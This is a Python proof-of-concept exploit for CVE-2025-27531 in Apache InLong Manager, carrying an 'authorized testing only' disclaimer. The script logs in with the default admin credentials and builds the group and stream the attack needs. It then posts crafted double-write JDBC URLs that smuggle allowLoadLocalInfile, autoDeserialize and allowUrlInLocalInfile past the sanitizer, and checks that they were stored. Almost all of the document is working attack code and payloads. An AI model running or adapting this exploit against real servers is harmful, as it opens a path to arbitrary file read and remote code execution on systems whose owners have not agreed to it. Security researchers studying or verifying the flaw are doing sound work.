#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache InLong Manager — JDBC URL Sanitization Bypass (Sink Endpoint)
# CVE            : CVE-2025-27531
# Vendor         : Apache Software Foundation
# Product        : Apache InLong Manager
# Affected       : 1.13.0 <= version < 2.1.0
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.8 (CRITICAL)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-27531 — Vector 1: Sink Save Endpoint Bypass

Demonstrates a double-write bypass of MySQLSensitiveUrlUtils.filterSensitive()
via POST /api/sink/save. The sanitizer's single-pass for loop allows nested
parameter names to reassemble after the inner match is removed.

ATTACK CHAIN:
  1. Authenticate as admin/inlong (default credentials)
  2. Create InLong group + stream (prerequisites for sink)
  3. POST /api/sink/save with double-write JDBC URL payload
  4. Verify dangerous parameters survive sanitization in stored URL

PREREQUISITES:
  - Python 3 (stdlib only)
  - Network access to InLong Manager REST API (port 8083)

REFERENCES:
  - CVE-2025-27531
  - https://github.com/advisories/GHSA-62gc-8jr5-x9pm
"""

import sys
import json
import http.client
import time
import re
from urllib.parse import urlparse


# =============================================================================
# Configuration
# =============================================================================

DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8083
CONTEXT_PATH = "/inlong/manager"

# Default credentials for InLong Manager
USERNAME = "admin"
PASSWORD = "inlong"

# Double-write bypass payloads
# The inner occurrence of the sensitive param is removed by the single-pass sanitizer,
# leaving the outer fragments to reassemble the dangerous parameter.
BYPASS_PAYLOADS = {
    "allowLoadLocalInfile": {
        "crafted_url": "jdbc:mysql://address=(host=127.0.0.1)(port=3306)(allowLoadallowLoadLocalInfile=trueLocalInfile=true)/test",
        "expected_bypass": "allowLoadLocalInfile=true",
        "description": "Arbitrary file read via LOAD DATA LOCAL INFILE",
    },
    "autoDeserialize": {
        "crafted_url": "jdbc:mysql://address=(host=127.0.0.1)(port=3306)(autoDeautoDeserialize=trueserialize=true)/test",
        "expected_bypass": "autoDeserialize=true",
        "description": "Remote code execution via Java deserialization",
    },
    "allowUrlInLocalInfile": {
        "crafted_url": "jdbc:mysql://address=(host=127.0.0.1)(port=3306)(allowUrlInallowUrlInLocalInfile=trueLocalInfile=true)/test",
        "expected_bypass": "allowUrlInLocalInfile=true",
        "description": "URL-based file read via LOAD DATA LOCAL INFILE",
    },
}


class InLongExploit:
    """CVE-2025-27531 PoC: JDBC URL sanitization bypass via double-write technique."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.base_url = f"{CONTEXT_PATH}/api"
        self.session_cookie = None

    def _request(self, method, path, body=None, expect_json=True):
        """Make an HTTP request to the InLong Manager API."""
        conn = http.client.HTTPConnection(self.host, self.port, timeout=30)
        headers = {"Content-Type": "application/json"}
        if self.session_cookie:
            headers["Cookie"] = self.session_cookie

        url = f"{self.base_url}{path}"
        json_body = json.dumps(body) if body else None

        try:
            conn.request(method, url, body=json_body, headers=headers)
            response = conn.getresponse()

            # Extract Set-Cookie header for session management
            cookie_header = response.getheader("Set-Cookie")
            if cookie_header and "JSESSIONID=" in cookie_header:
                # Parse JSESSIONID from Set-Cookie header
                match = re.search(r'JSESSIONID=([^;]+)', cookie_header)
                if match:
                    self.session_cookie = f"JSESSIONID={match.group(1)}"

            data = response.read().decode("utf-8")
            if expect_json and data:
                return json.loads(data)
            return data
        except Exception as e:
            print(f"  [!] Request failed: {e}")
            return None
        finally:
            conn.close()

    def authenticate(self):
        """Step 1: Authenticate with InLong Manager using default credentials."""
        print("[*] Step 1: Authenticating with InLong Manager...")
        print(f"    Target: http://{self.host}:{self.port}{self.base_url}/anno/login")
        print(f"    Credentials: {USERNAME}/{PASSWORD}")

        result = self._request("POST", "/anno/login", {
            "username": USERNAME,
            "password": PASSWORD,
        })

        if result and result.get("success"):
            print(f"    [+] Authentication successful!")
            print(f"    [+] Session: {self.session_cookie}")
            return True
        else:
            print(f"    [-] Authentication failed: {result}")
            return False

    def create_group(self, group_id):
        """Step 2: Create an InLong group (prerequisite for sink creation)."""
        print(f"\n[*] Step 2: Creating InLong group '{group_id}'...")

        result = self._request("POST", "/group/save", {
            "inlongGroupId": group_id,
            "mqType": "PULSAR",
            "name": f"PoC group for CVE-2025-27531",
            "inCharges": "admin",
        })

        if result and result.get("success"):
            print(f"    [+] Group created successfully (id: {result.get('data')})")
            return True
        else:
            err = result.get("errMsg", "unknown") if result else "no response"
            # Group may already exist from a previous run
            if "already exist" in str(err).lower():
                print(f"    [*] Group already exists, continuing...")
                return True
            print(f"    [-] Group creation failed: {err}")
            return False

    def create_stream(self, group_id, stream_id):
        """Step 3: Create an InLong stream within the group."""
        print(f"\n[*] Step 3: Creating InLong stream '{stream_id}' in group '{group_id}'...")

        result = self._request("POST", "/stream/save", {
            "inlongGroupId": group_id,
            "inlongStreamId": stream_id,
            "name": f"PoC stream for CVE-2025-27531",
            "dataType": "CSV",
        })

        if result and result.get("success"):
            print(f"    [+] Stream created successfully (id: {result.get('data')})")
            return True
        else:
            err = result.get("errMsg", "unknown") if result else "no response"
            if "already exist" in str(err).lower():
                print(f"    [*] Stream already exists, continuing...")
                return True
            print(f"    [-] Stream creation failed: {err}")
            return False

    def create_sink_with_bypass(self, group_id, stream_id, sink_name, crafted_jdbc_url):
        """Step 4: Create a MySQL sink with the double-write bypass JDBC URL."""
        print(f"\n[*] Step 4: Creating MySQL sink '{sink_name}' with crafted JDBC URL...")
        print(f"    Crafted URL: {crafted_jdbc_url}")

        result = self._request("POST", "/sink/save", {
            "sinkType": "MYSQL",
            "sinkName": sink_name,
            "inlongGroupId": group_id,
            "inlongStreamId": stream_id,
            "jdbcUrl": crafted_jdbc_url,
            "username": "root",
            "password": "test",
            "databaseName": "test",
            "tableName": "test",
        })

        if result and result.get("success"):
            sink_id = result.get("data")
            print(f"    [+] Sink created successfully (id: {sink_id})")
            return sink_id
        else:
            err = result.get("errMsg", "unknown") if result else "no response"
            print(f"    [-] Sink creation failed: {err}")
            return None

    def verify_bypass(self, sink_id, expected_bypass):
        """Step 5: Retrieve the stored sink and verify the bypass succeeded."""
        print(f"\n[*] Step 5: Retrieving stored sink (id: {sink_id}) to verify bypass...")

        result = self._request("GET", f"/sink/get/{sink_id}")

        if result and result.get("success"):
            sink_data = result.get("data", {})
            stored_url = sink_data.get("jdbcUrl", "")
            print(f"    Stored JDBC URL: {stored_url}")

            if expected_bypass in stored_url:
                print(f"    [+] BYPASS CONFIRMED! '{expected_bypass}' survived sanitization!")
                return True, stored_url
            else:
                print(f"    [-] Bypass NOT detected in stored URL")
                return False, stored_url
        else:
            err = result.get("errMsg", "unknown") if result else "no response"
            print(f"    [-] Failed to retrieve sink: {err}")
            return False, None


def exploit(target_host, target_port):
    """Run the CVE-2025-27531 exploit against the target InLong Manager."""

    print("=" * 72)
    print("CVE-2025-27531: Apache InLong Manager JDBC URL Sanitization Bypass")
    print("Double-write technique bypasses MySQLSensitiveUrlUtils.filterSensitive()")
    print("=" * 72)
    print(f"\nTarget: http://{target_host}:{target_port}{CONTEXT_PATH}")
    print()

    client = InLongExploit(target_host, target_port)

    # Step 1: Authenticate
    if not client.authenticate():
        print("\n[!] FAILED: Could not authenticate. Aborting.")
        sys.exit(1)

    # Step 2: Create InLong group (prerequisite)
    group_id = "poc_cve_2025_27531"
    if not client.create_group(group_id):
        print("\n[!] FAILED: Could not create group. Aborting.")
        sys.exit(1)

    # Step 3: Create InLong stream (prerequisite)
    stream_id = "poc_stream"
    if not client.create_stream(group_id, stream_id):
        print("\n[!] FAILED: Could not create stream. Aborting.")
        sys.exit(1)

    # Step 4 & 5: Test each bypass payload
    results = {}
    timestamp = int(time.time())

    for param_name, payload_info in BYPASS_PAYLOADS.items():
        print("\n" + "-" * 72)
        print(f"Testing bypass for: {param_name}")
        print(f"Impact: {payload_info['description']}")
        print("-" * 72)

        sink_name = f"poc_{param_name}_{timestamp}"
        sink_id = client.create_sink_with_bypass(
            group_id, stream_id, sink_name, payload_info["crafted_url"]
        )

        if sink_id:
            bypassed, stored_url = client.verify_bypass(sink_id, payload_info["expected_bypass"])
            results[param_name] = {
                "success": bypassed,
                "sink_id": sink_id,
                "crafted_url": payload_info["crafted_url"],
                "stored_url": stored_url,
                "expected": payload_info["expected_bypass"],
            }
        else:
            results[param_name] = {"success": False, "error": "Sink creation failed"}

    # Print summary
    print("\n" + "=" * 72)
    print("RESULTS SUMMARY")
    print("=" * 72)

    all_passed = True
    for param_name, result in results.items():
        status = "BYPASSED" if result.get("success") else "FAILED"
        icon = "[+]" if result.get("success") else "[-]"
        print(f"  {icon} {param_name}: {status}")
        if result.get("success"):
            print(f"      Input:  {result['crafted_url']}")
            print(f"      Stored: {result['stored_url']}")
            print(f"      Proof:  '{result['expected']}' present in stored URL")
        if not result.get("success"):
            all_passed = False

    print()
    if all_passed:
        print("[+] CVE-2025-27531 CONFIRMED: All sanitization bypasses succeeded!")
        print("[+] An attacker can inject dangerous MySQL JDBC parameters via double-write technique.")
        print("[+] Impact: Arbitrary file read (allowLoadLocalInfile) and RCE (autoDeserialize)")
    else:
        some_passed = any(r.get("success") for r in results.values())
        if some_passed:
            print("[*] CVE-2025-27531 PARTIALLY CONFIRMED: Some bypasses succeeded.")
        else:
            print("[-] CVE-2025-27531 NOT CONFIRMED: No bypasses succeeded.")

    return all_passed


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    success = exploit(target, port)
    sys.exit(0 if success else 1)
